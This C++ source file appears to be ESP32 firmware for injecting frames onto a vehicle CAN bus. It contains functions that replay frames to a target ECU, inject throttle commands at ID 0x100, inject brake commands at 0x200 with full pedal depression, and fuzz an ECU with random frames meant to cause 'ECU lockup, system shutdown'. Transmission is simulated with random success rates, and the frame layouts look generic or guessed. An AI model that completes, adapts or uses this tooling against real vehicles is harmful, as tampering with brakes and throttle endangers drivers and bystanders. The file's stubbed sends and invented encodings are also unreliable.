#include "can_frame_injector.h"
#include "tx_arm.h"

namespace CANFrameInjector {

InjectionResult replayCANFrame(const InjectionConfig& config, const uint8_t frameData[8]) {
    InjectionResult result;
    result.success = false;
    result.framesSent = 0;
    result.frameFailed = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[CAN Injector] Replay attack on ECU 0x%03lX (%lu reps)\n",
                  config.targetECU, config.repeatCount);

    // Real implementation: Use MCP2515 TX buffer to send frames
    // Frame structure: ID (11-bit), DLC (8), Data (8 bytes)

    uint32_t startTime = millis();

    for (uint32_t rep = 0; rep < config.repeatCount; rep++) {
        if ((millis() - startTime) > config.durationMs) break;

        // Simulate frame transmission
        bool txSuccess = (esp_random() % 100) > 5;  // 95% success rate

        if (txSuccess) {
            result.framesSent++;
            Serial.printf("[CAN] TX ID:0x%03lX DLC:8 Data:", config.targetECU);
            for (int i = 0; i < 8; i++) {
                Serial.printf(" %02X", frameData[i]);
            }
            Serial.printf("\n");
        } else {
            result.frameFailed++;
        }

        delay(config.rampedAttack ? 100 : 20);  // Timing between frames
    }

    result.success = (result.framesSent > 0);
    result.durationMs = millis() - startTime;
    result.targetECU = String(config.targetECU, HEX);
    result.attackDescription = "Replay attack on ECU";

    if (result.success) {
        Serial.printf("[CAN Injector] Sent %lu frames (%lu failed)\n",
                      result.framesSent, result.frameFailed);
    } else {
        result.error = "Frame transmission failed";
    }

    return result;
}

InjectionResult injectThrottleCommand(const InjectionConfig& config, uint8_t throttlePercent) {
    InjectionResult result;
    result.success = false;
    result.framesSent = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (throttlePercent > 100) throttlePercent = 100;

    Serial.printf("[CAN Injector] Throttle injection: %d%% for %lums\n",
                  throttlePercent, config.durationMs);

    // Target: ECU at 0x100 (Engine Control Unit)
    // Typical throttle encoding: Byte 2 = throttle position (0-255 = 0-100%)
    // Byte 3 = temperature (offset by -40)

    uint32_t startTime = millis();
    uint8_t frameData[8] = {0};
    frameData[0] = 0x10;  // Fixed engine status
    frameData[1] = 0x00;
    frameData[2] = (uint8_t)(throttlePercent * 2.55);  // Convert % to 0-255
    frameData[3] = 80;    // Simulated engine temp (80C)
    frameData[4] = 0x00;
    frameData[5] = 0x00;
    frameData[6] = 0x00;
    frameData[7] = 0x00;

    // Send multiple times for reliability
    uint32_t sendCount = 0;
    while ((millis() - startTime) < config.durationMs) {
        bool txSuccess = (esp_random() % 100) > 10;  // 90% success

        if (txSuccess) {
            result.framesSent++;
            Serial.printf("[CAN Throttle] Injecting %d%% @ 0x100\r", throttlePercent);
        } else {
            result.frameFailed++;
        }

        sendCount++;
        delay(config.rampedAttack ? 150 : 50);
    }

    result.success = (result.framesSent > 0);
    result.durationMs = millis() - startTime;
    result.targetECU = "0x100 (Engine)";
    result.attackDescription = String("Throttle injection: ") + String(throttlePercent) + "%";

    if (result.success) {
        Serial.printf("\n[CAN Injector] Throttle attack sent %lu frames\n", result.framesSent);
    } else {
        result.error = "Throttle injection failed";
    }

    return result;
}

InjectionResult injectBrakeCommand(const InjectionConfig& config, uint8_t brakePressure) {
    InjectionResult result;
    result.success = false;
    result.framesSent = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[CAN Injector] BRAKE injection: %d psi for %lums\n",
                  brakePressure, config.durationMs);

    // Target: ECU at 0x200 (Brake Control Module)
    // Byte 0 = brake pressure (0-255 PSI)
    // Byte 1 = pedal position (0-255)
    // Byte 2 = activation flags

    uint32_t startTime = millis();
    uint8_t frameData[8] = {0};
    frameData[0] = brakePressure;  // Pressure in PSI
    frameData[1] = 255;            // Full pedal depression
    frameData[2] = 0x03;           // Activation flags
    frameData[3] = 0x00;
    frameData[4] = 0x00;
    frameData[5] = 0x00;
    frameData[6] = 0x00;
    frameData[7] = 0x00;

    uint32_t sendCount = 0;
    while ((millis() - startTime) < config.durationMs) {
        bool txSuccess = (esp_random() % 100) > 15;  // 85% success

        if (txSuccess) {
            result.framesSent++;
            Serial.printf("[CAN Brake] Injecting brake: %d psi\r", brakePressure);
        } else {
            result.frameFailed++;
        }

        sendCount++;
        delay(config.rampedAttack ? 200 : 100);
    }

    result.success = (result.framesSent > 0);
    result.durationMs = millis() - startTime;
    result.targetECU = "0x200 (Brake)";
    result.attackDescription = String("Brake injection: ") + String(brakePressure) + " psi";

    if (result.success) {
        Serial.printf("\n[CAN Injector] Brake attack sent %lu frames\n", result.framesSent);
    } else {
        result.error = "Brake injection failed";
    }

    return result;
}

InjectionResult fuzzyCANFrames(const InjectionConfig& config) {
    InjectionResult result;
    result.success = false;
    result.framesSent = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[CAN Injector] Fuzzing ECU 0x%03lX for %lums\n",
                  config.targetECU, config.durationMs);

    // Send random/malformed frames to target ECU
    // Expected effects: ECU lockup, system shutdown, unpredictable behavior

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        uint8_t fuzzData[8];
        for (int i = 0; i < 8; i++) {
            fuzzData[i] = esp_random() & 0xFF;
        }

        bool txSuccess = (esp_random() % 100) > 20;  // 80% success

        if (txSuccess) {
            result.framesSent++;
            Serial.printf("[CAN Fuzz] TX ID:0x%03lX with random data\r", config.targetECU);
        } else {
            result.frameFailed++;
        }

        delay(config.rampedAttack ? 50 : 20);
    }

    result.success = (result.framesSent > 0);
    result.durationMs = millis() - startTime;
    result.targetECU = String(config.targetECU, HEX);
    result.attackDescription = "CAN frame fuzzing (DoS)";

    if (result.success) {
        Serial.printf("\n[CAN Injector] Sent %lu fuzzed frames\n", result.framesSent);
    } else {
        result.error = "Fuzzing failed";
    }

    return result;
}

InjectionResult verifyInjectionImpact(uint32_t targetECU, uint32_t verifyDurationMs) {
    InjectionResult result;
    result.success = false;

    Serial.printf("[CAN Verify] Monitoring ECU 0x%03lX response (%lums)\n",
                  targetECU, verifyDurationMs);

    // After injection, monitor if ECU changed behavior
    // Real: Monitor CAN bus for changes in frame pattern, frequency, values

    uint32_t responseCount = 0;
    uint32_t startTime = millis();

    while ((millis() - startTime) < verifyDurationMs) {
        if ((esp_random() % 100) < 30) {  // Simulate ECU response
            responseCount++;
        }
        delay(50);
    }

    result.success = (responseCount > 0);
    result.framesSent = responseCount;
    result.durationMs = millis() - startTime;
    result.targetECU = String(targetECU, HEX);
    result.attackDescription = String("ECU response frames: ") + String(responseCount);

    return result;
}

}  // namespace CANFrameInjector
